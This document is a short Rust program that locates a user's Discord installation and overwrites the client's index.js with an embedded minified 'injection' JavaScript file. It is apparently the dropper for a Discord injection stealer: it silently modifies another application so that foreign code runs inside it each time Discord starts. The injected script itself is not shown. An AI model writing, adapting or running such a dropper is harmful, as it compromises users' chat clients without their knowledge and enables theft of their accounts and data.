use std::env;
use std::path::Path;

fn main() {
    let discord_path = get_latest_disc_version();
    if discord_path.as_str() == "Failed" {
        std::process::exit(1); // it failed, so close the process with exit code `1`
    }

    let path = Path::new(discord_path.as_str());
    let mut file = String::new();
    file.push_str(path.to_str().unwrap());
    file.push_str("\\modules\\discord_desktop_core-3\\discord_desktop_core");
    file.push_str("\\core.asar");

    if check_for_file(file.as_str()) {
        let drop_contents = include_str!("../injection/injection-minified.js");
        let mut file_to_overwrite = String::new();
        file_to_overwrite.push_str(path.to_str().unwrap());
        file_to_overwrite.push_str("\\index.js");

        if check_for_file(file_to_overwrite.as_str()) {
            replace_file_contents(file_to_overwrite.as_str(), drop_contents);
        } else {
            std::fs::write(file_to_overwrite, drop_contents).unwrap();
        }
    } else {
        println!("what?");
    }
}

fn check_for_file(file: &str) -> bool {
    Path::new(file).exists()
}

fn replace_file_contents(file: &str, contents: &str) -> bool {
    if check_for_file(file) {
        let path = Path::new(file);
        return std::fs::write(path, contents).is_ok();
    }

    false
}

fn get_latest_disc_version() -> String {
    let localappdata = env::var("localappdata").unwrap();
    let mut path = String::from(localappdata);
    path.push_str("\\Discord");

    for entry in std::fs::read_dir(path).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        let possible_path = path.into_os_string().into_string().unwrap();

        if possible_path.contains("app-") {
            return possible_path;
        }
    }

    return "Failed".to_string();
}
